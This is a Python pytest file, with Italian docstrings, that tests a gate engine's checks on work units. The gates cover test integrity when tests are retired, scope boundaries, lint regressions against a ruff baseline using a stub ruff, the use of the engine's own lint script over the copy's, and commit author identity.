    integrity = _gate(result, "integrità dei test")
    assert integrity.ok, integrity.reason
    assert "2 casi ritirati" in integrity.reason
    assert "tests/test_sample.py" in integrity.reason
    collected = _gate(result, "test raccolti")
    assert collected.ok, collected.reason
    assert "2 test ritirati" in collected.reason
    assert "tests/test_sample.py" in collected.reason
    package = Path(result["package"]).read_text(encoding="utf-8")
    assert "## Voci di test_removal_ok aggiunte dall'unità" in package
    assert "- `tests/test_sample.py`" in package
    assert result["verdict"] == "PASS", [str(item) for item in result["gates"] if not item.ok]


def test_a_unit_that_authorises_and_retires_in_one_commit_fails_both_test_gates(task, repo, tmp_path):
    """Autorizzare e usare l'autorizzazione nello stesso commit è il caso che non deve passare mai."""
    folder = _unit(task, repo, tmp_path, allow=["**"])
    _write(folder, ".nexgen-discipline.toml", 'test_removal_ok = ["tests/test_sample.py"]\n')
    (folder / "tests" / "test_sample.py").unlink()
    git_in(folder, "add", "-A")
    git_in(folder, "commit", "-q", "-m", "test: autorizza e ritira insieme")

    result = gates.collect(task, "prova")

    integrity = _gate(result, "integrità dei test")
    assert not integrity.ok
    assert "commit " in integrity.reason
    assert "tests went from 2 to 0" in integrity.reason
    collected = _gate(result, "test raccolti")
    assert not collected.ok
    assert "tests/test_sample.py::test_value" in collected.reason
    assert result["verdict"] == "FAIL"


def test_a_unit_without_the_configuration_in_its_boundary_is_still_judged_on_the_base(task, repo, tmp_path):
    """Senza il permesso nulla cambia: il confine rifiuta il file e i due cancelli leggono solo la base."""
    folder = _unit(task, repo, tmp_path, allow=["tests/*.py", "module.py"])
    _write(folder, ".nexgen-discipline.toml", 'test_removal_ok = ["tests/test_sample.py"]\n')
    (folder / "tests" / "test_sample.py").unlink()
    git_in(folder, "add", "-A")
    git_in(folder, "commit", "-q", "-m", "test: autorizza e ritira insieme")

    result = gates.collect(task, "prova")

    scope = _gate(result, "confine")
    assert not scope.ok
    assert ".nexgen-discipline.toml" in scope.reason
    assert not _gate(result, "integrità dei test").ok
    assert not _gate(result, "test raccolti").ok
    assert result["verdict"] == "FAIL"


# --- il cancello lint -------------------------------------------------------

#: Le codice che la baseline del progetto finto già conosce.
BASELINE_CODES = ("F401",)

#: Un ruff finto: stampa i risultati che gli sono stati dati e accetta gli argomenti veri.
STUB_RUFF = """
import json, sys
from pathlib import Path

findings = [
    {"filename": str(Path.cwd() / "03-INFRA" / "scripts" / "x.py"), "code": code}
    for code in __CODES__
]
print(json.dumps(findings))
raise SystemExit(1 if findings else 0)
"""


def _lint_project(repo, baseline=()) -> None:
    """Il progetto guadagna il suo cancello lint: lo script e una baseline già scritta."""
    repo.write("03-INFRA/scripts/ruff_baseline_check.py", "# il cancello lint del progetto\n")
    repo.write("03-INFRA/ruff-baseline.json", json.dumps([
        {"file": "03-INFRA/scripts/x.py", "code": code, "count": 1} for code in baseline
    ]) + "\n")
    repo.commit("base con il cancello lint")


def _stub_ruff(monkeypatch, tmp_path, codes) -> None:
    stub = tmp_path / "ruff_finto.py"
    stub.write_text(STUB_RUFF.replace("__CODES__", repr(tuple(codes))), encoding="utf-8")
    monkeypatch.setenv("RUFF_CMD", json.dumps([sys.executable, str(stub)]))



def test_a_copy_without_the_lint_gate_says_so_and_passes(task, repo, tmp_path):
    folder = _unit(task, repo, tmp_path)
    _commit(folder, "docs: aggiunge una riga", {"docs/guida.md": "# guida\n\nriga.\n"})

    result = gates.collect(task, "prova")

    gate = _gate(result, "lint")
    assert gate.ok
    assert "non ha 03-INFRA/scripts/ruff_baseline_check.py" in gate.reason
    assert result["verdict"] == "PASS"


def test_lint_debt_already_in_the_baseline_does_not_fail(task, repo, tmp_path, monkeypatch):
    _lint_project(repo, baseline=BASELINE_CODES)
    folder = _unit(task, repo, tmp_path)
    _commit(folder, "docs: aggiunge una riga", {"docs/guida.md": "# guida\n\nriga.\n"})
    _stub_ruff(monkeypatch, tmp_path, BASELINE_CODES)

    result = gates.collect(task, "prova")

    gate = _gate(result, "lint")
    assert gate.ok, gate.reason
    assert "nessuna regressione" in gate.reason
    assert result["verdict"] == "PASS"


def test_a_new_lint_finding_fails_the_gate_and_is_named(task, repo, tmp_path, monkeypatch):
    _lint_project(repo)
    folder = _unit(task, repo, tmp_path)
    _commit(folder, "docs: aggiunge una riga", {"docs/guida.md": "# guida\n\nriga.\n"})
    _stub_ruff(monkeypatch, tmp_path, BASELINE_CODES)

    result = gates.collect(task, "prova")

    gate = _gate(result, "lint")
    assert not gate.ok
    assert "regressione" in gate.reason
    assert "03-INFRA/scripts/x.py" in gate.detail
    assert result["verdict"] == "FAIL"


def test_the_gate_runs_the_engines_script_not_the_one_in_the_copy(task, repo, tmp_path):
    """La copia non può fornire il proprio verificatore: lo script del motore vince."""
    _lint_project(repo)
    folder = _unit(task, repo, tmp_path)

    script = lint.script_for(folder)

    assert script is not None
    assert not script.resolve().is_relative_to(folder.resolve())
    assert script.name == "ruff_baseline_check.py"


def test_identity_gate_fails_when_commit_has_different_email(task, repo, tmp_path):
    folder = _unit(task, repo, tmp_path)
    target = folder / "docs" / "guida.md"
    target.write_text("# guida\n\nseconda riga.\n", encoding="utf-8")
    git_in(folder, "add", "-A")
    git_in(folder, "-c", "user.email=estraneo@example.com", "commit", "-q", "-m", "docs: riga con email diversa")

    result = gates.collect(task, "prova")

    assert result["verdict"] == "FAIL"
    gate = _gate(result, "identità")
    assert not gate.ok
    assert "estraneo@example.com" in gate.reason


def test_identity_gate_fails_when_commit_has_different_author_name(task, repo, tmp_path):
    folder = _unit(task, repo, tmp_path)
    target = folder / "docs" / "guida.md"
    target.write_text("# guida\n\nseconda riga.\n", encoding="utf-8")
    git_in(folder, "add", "-A")
    git_in(folder, "-c", "user.name=Altro", "commit", "-q", "-m", "docs: riga con autore diverso")

    result = gates.collect(task, "prova")

    assert result["verdict"] == "FAIL"
    gate = _gate(result, "identità")
    assert not gate.ok
    assert "Altro" in gate.reason


def test_identity_gate_passes_for_legacy_unit_without_recorded_identity(task, repo, tmp_path):
    folder = _unit(task, repo, tmp_path)
    _commit(folder, "docs: aggiunge una riga", {"docs/guida.md": "# guida\n\nseconda riga.\n"})
    diario = state.open_task(task) / "01-diario.jsonl"
    events = state.read_events(task)
    for ev in events:
        if ev.get("event") == "unit_created":
            ev.pop("identity", None)
    diario.write_text("\n".join(json.dumps(ev) for ev in events) + "\n", encoding="utf-8")

    result = gates.collect(task, "prova")

    assert result["verdict"] == "PASS"
    gate = _gate(result, "identità")
    assert gate.ok
    assert "senza identità registrata" in gate.reason
    package = Path(result["package"]).read_text(encoding="utf-8")
    assert "- identità: non registrata" in package


def test_the_package_displays_registered_identity(task, repo, tmp_path):
    folder = _unit(task, repo, tmp_path)
    _commit(folder, "docs: aggiunge una riga", {"docs/guida.md": "# guida\n\nseconda riga.\n"})

    result = gates.collect(task, "prova")

    package = Path(result["package"]).read_text(encoding="utf-8")
    assert "- identità: t <t@example.com>" in package


